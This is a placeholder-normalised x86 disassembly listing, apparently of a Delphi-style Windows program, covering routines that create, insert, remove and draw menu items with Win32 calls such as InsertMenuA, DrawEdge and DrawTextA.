movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4048dc
push eax
mov eax ebx
call sub_452184
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_453694
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404828
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4048dc
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_453abc
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_452184
mov [ ebp - 0x25 ] eax
sub_451efb
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_451c80
xor eax eax
pop ebp
retn
sub_451f20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4556b4
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45467c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_454b78
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4516bc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_451f90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_451fda
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41b508
mov eax [ ebp - 0x4 ]
call sub_451544
mov edx eax
mov eax ebx
call sub_453af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451fe1
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_451fe8
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_452054
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41e274
sub_452018
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41e5f4
mov eax ebx
call sub_453aa4
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_453aa4
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4038bc
pop esi
pop ebx
retn
mov eax ebx
call sub_452054
sub_452054
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_452184
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_452054
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_452184
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_452184
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_451f20
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebp
call sub_452184
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_452124
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_453abc
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_453acc
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_453acc
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_453acc
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_451238
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_452184
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_451f20
mov eax [ rw-data ]
call sub_451238
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_4521d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41e51c
push ebx
push sub_451f90
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_452214
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4523f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_454078
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4044c4
test bh 0x4
je r-xdata
mov eax edi
call sub_4556b4
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404828
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_421dfc
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4046ec
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_4217d4
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_4217e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4523ff
lea eax [ ebp - 0xc ]
call sub_40442c
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4224e8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4046e4
push eax
mov eax [ ebp - 0xc ]
call sub_4048dc
push eax
mov eax [ ebp - 0x4 ]
call sub_4224e8
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0x80000014
call sub_421514
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4046e4
push eax
mov eax [ ebp - 0xc ]
call sub_4048dc
push eax
mov eax [ ebp - 0x4 ]
call sub_4224e8
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0x80000010
call sub_421514
mov eax 0x8000000d
call sub_421054
mov esi eax
mov eax 0x80000010
call sub_421054
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0x80000014
call sub_421514
jmp r-xdata
sub_452464
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_452cbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2d ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404828
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x3d ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_44f260
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4224e8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x59 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_421cd8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x35 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000d
call sub_421ce0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0x8000000f
call sub_421ce0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_421cd8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov edx 0x80000014
mov eax 0x8000000f
call sub_42896c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_421cb4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2d ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x60 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x61 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4224e8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422084
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42677c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
xor eax eax
push ebp
push sub_452836
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
call sub_4278c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0x80000012
call sub_421514
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_44f260
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_421ce0
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x60 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_452214
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x54 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_4217e0
mov eax [ ebp + 0x8 ]
or [ eax - 0x60 ] 0x100000
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4224e8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_422210
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x58 ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x3c ]
call sub_44f778
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_421fd8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_421514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
call sub_4036c0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x21 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x60 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
call sub_452214
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
